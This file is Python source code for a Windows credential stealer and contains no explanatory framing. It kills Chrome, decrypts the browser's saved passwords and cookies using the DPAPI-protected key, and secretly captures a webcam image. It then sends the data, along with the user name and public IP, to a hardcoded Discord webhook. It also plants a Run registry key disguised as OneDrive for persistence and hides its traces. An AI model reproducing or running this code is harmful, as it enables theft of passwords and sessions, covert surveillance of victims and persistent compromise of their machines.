
import os
os.system("pip install -q psutil requests opencv-python pycryptodome pypiwin32 keyboard opencv-python")

import requests
import sqlite3
import os
import getpass
import time
import shutil
import win32crypt
import json
import base64
import time
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import base64
import cv2
import psutil
import re
import threading
import sys
import subprocess
import warnings
import winreg

hook = "https://discordapp.com/api/webhooks/1296290171498795069/MAfX2MZJBWNeQz3axpazc6DRtSL-lFqJT50gKjikgWl0O0LAAsoIiyeTWjCFmITVPyyf"

user = getpass.getuser()

warnings.filterwarnings("ignore")
os.environ["OPENCV_LOG_LEVEL"]="OFF"  
cv2.setLogLevel(0)  

def take_pic():
    try:
        capture = cv2.VideoCapture(0)
        if capture.isOpened():
            ret, frame = capture.read()
            if ret:
                cv2.imwrite("webcam.jpg", frame)
                os.system(f"attrib +h \"webcam.jpg\"")
                return True
        else:
            return False
    except:
        return False


def decrypt_cookies(key):
    if "chrome.exe" in (i.name() for i in psutil.process_iter()):
       os.system("taskkill /F /IM chrome.exe > nul")
    path = shutil.copy(f"C:/Users/{user}/AppData/Local/Google/Chrome/User Data/Default/Network/Cookies", "./")
    os.system(f"attrib +h \"{path}\"")
    conn = sqlite3.connect("./Cookies")
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, CAST(encrypted_value AS BLOB) FROM cookies")
    results = cursor.fetchall()
    with open("cookies.txt", "w", encoding='utf-8') as f:
        path = "./cookies.txt"
        os.system(f"attrib +h \"{path}\"")
        for host_key, encrypted_value in results:

            cipher = AES.new(key, AES.MODE_GCM, nonce=encrypted_value[3:15])
            decrypted_val = cipher.decrypt(encrypted_value[15:])
            decrypted_value = decrypted_val[:-16]
            decrypted_value = base64.b64encode(decrypted_value).decode()

            f.write(f"URL: {host_key}\n")
            f.write(f"Cookie: {decrypted_value}\n")
            f.write("------------------------\n")

def decrypt_login_data(key):
    if "chrome.exe" in (i.name() for i in psutil.process_iter()):
       os.system("taskkill /F /IM chrome.exe > nul")
    path = shutil.copy(f"C:/Users/{user}/AppData/Local/Google/Chrome/User Data/Default/Login Data", "./")
    os.system(f"attrib +h \"{path}\"")
    conn = sqlite3.connect("./Login Data")
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    results = cursor.fetchall()
    with open("./chrome.txt", 'w') as f:
        path = "./chrome.txt"
        os.system(f"attrib +h \"{path}\"")
        for url, username_value, password_value in results:
            cipher = AES.new(key, AES.MODE_GCM, nonce=password_value[3:15])
            decrypted_pass = cipher.decrypt(password_value[15:])
            decrypted_password = decrypted_pass[:-16].decode()
            f.write(f"URL: {url}\n")
            f.write(f"Username: {username_value}\n")
            f.write(f"Password: {decrypted_password}\n")
            f.write("------------------------\n")

def get_aes_key():
    path = shutil.copy(f"C:/Users/{user}/AppData/Local/Google/Chrome/User Data/Local State", "./")
    with open(path, "r") as f:
        local_state = json.load(f)
        os.system(f"attrib +h \"{path}\"") 
    dpapi_encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    os.remove("./Local State")
    dpapi_encrypted_key = dpapi_encrypted_key[5:]
    key = win32crypt.CryptUnprotectData(dpapi_encrypted_key, None, None, None, 0)[1]
    return key
    
def set_reg_key():
    runkey = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run")
    winreg.SetValueEx(runkey, "MicrosoftOneDrive", 0, winreg.REG_SZ, r"wscript.exe C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Network\Connections\run.vbs")
    runkey.Close()

def main():

    set_reg_key()

    if os.path.exists(os.getcwd() + "\\Login Data"):
        os.system(f"attrib -h \"Login Data\"")
        os.remove(os.getcwd() + "\\Login Data")
    if os.path.exists(os.getcwd() + "\\Local State"):
        os.system(f"attrib -h \"Local State\"")
        os.remove(os.getcwd() + "\\Local State")
    if os.path.exists(os.getcwd() + "\\chrome.txt"):
        os.system(f"attrib -h chrome.txt")
        os.remove(os.getcwd() + "\\chrome.txt")
    if os.path.exists(os.getcwd() + "\\Cookies"):
        os.system(f"attrib -h Cookies")
        os.remove(os.getcwd() + "\\Cookies")
    if os.path.exists(os.getcwd() + "\\cookies.txt"):
        os.system(f"attrib -h cookies.txt")
        os.remove(os.getcwd() + "\\cookies.txt")
    if os.path.exists(os.getcwd() + "\\webcam.jpg"):
        os.system(f"attrib -h webcam.jpg")
        os.remove(os.getcwd() + "\\webcam.jpg")

    def take_pic_wrapper():
        global webcam_result
        webcam_result = take_pic()

    cam = threading.Thread(target=take_pic_wrapper)
    cam.start()


    alert = " "

    key = get_aes_key()


    decrypt_login_data(key)

    decrypt_cookies(key)

    ip = requests.get("https://icanhazip.com/")
    ip = ip.content.decode('utf-8').strip()

    chrome = open("chrome.txt", "rb")
    cookies = open("cookies.txt", "rb")

    cam.join()

        
    content = {"content": f"```{user} | ip: {ip}```" }

    if webcam_result == True:
        webcam = open("webcam.jpg", "rb")
        files = {
        "chrome.txt": chrome,
        "cookies.txt": cookies,
        "file": ('webcam.jpg', webcam, 'image/jpeg')
        }
    

    else:
        alert = "No Availible Camera"
        files = {
        "chrome.txt": chrome,
        "cookies.txt": cookies,
        }
    
    content = {"content": f"```{user} | ip: {ip} | {alert} ```" }

    response = requests.post(hook, data=content, files=files)

    chrome.close()
    cookies.close()

    if os.path.exists(os.getcwd() + "\\Login Data"):
        os.system(f"attrib -h \"Login Data\"")
        os.remove(os.getcwd() + "\\Login Data")
    if os.path.exists(os.getcwd() + "\\Local State"):
        os.system(f"attrib -h \"Local State\"")
        os.remove(os.getcwd() + "\\Local State")
    if os.path.exists(os.getcwd() + "\\chrome.txt"):
        os.system(f"attrib -h chrome.txt")
        os.remove(os.getcwd() + "\\chrome.txt")
    if os.path.exists(os.getcwd() + "\\Cookies"):
        os.system(f"attrib -h Cookies")
        os.remove(os.getcwd() + "\\Cookies")
    if os.path.exists(os.getcwd() + "\\cookies.txt"):
        os.system(f"attrib -h cookies.txt")
        os.remove(os.getcwd() + "\\cookies.txt")
    if os.path.exists(os.getcwd() + "\\webcam.jpg"):
        webcam.close()
        os.system(f"attrib -h webcam.jpg")
        os.remove(os.getcwd() + "\\webcam.jpg")


main()